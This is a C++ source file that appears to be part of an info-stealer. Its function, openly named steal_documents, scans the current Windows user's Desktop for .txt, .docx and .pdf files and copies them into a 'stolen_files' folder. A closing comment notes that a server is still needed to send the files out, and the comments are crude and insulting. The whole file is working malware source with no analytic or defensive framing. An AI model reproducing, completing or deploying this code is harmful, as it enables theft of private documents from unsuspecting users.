#include "files.h"
#include "utils.h"

#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>

//file extensions to search for
const std::vector<std::string> targetExtensions = { ".txt", ".docx", ".pdf" };

//function to get path to the current users Desktop
static std::string get_desktop_path() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
        return std::string(path);
    }
    return "";
}

//function to copy file to destination directory, from Windows of course, asshole
static bool copy_file_to_folder(const std::string& srcFile, const std::string& destFolder) {
    try {
        std::filesystem::path srcPath(srcFile);
        std::filesystem::path destPath = std::filesystem::path(destFolder) / srcPath.filename();
        std::filesystem::copy_file(srcPath, destPath, std::filesystem::copy_options::overwrite_existing);
        return true;
    }
    catch (...) {
        return false;
    }
}

//main function to search and copy files
void steal_documents(const std::string& outputFolder) {
    std::string desktopPath = get_desktop_path();
    if (desktopPath.empty()) return;

    //create subfolder for stolen files
    std::string destFolder = outputFolder + "stolen_files\\";
    std::filesystem::create_directories(destFolder);

    for (const auto& entry : std::filesystem::directory_iterator(desktopPath)) {
        if (!entry.is_regular_file()) continue;

        std::string ext = entry.path().extension().string();
        for (const auto& targetExt : targetExtensions) {
            if (_stricmp(ext.c_str(), targetExt.c_str()) == 0) {
                copy_file_to_folder(entry.path().string(), destFolder);
                break;
            }
        }
    }
}
//but... you need to use a server dumbass
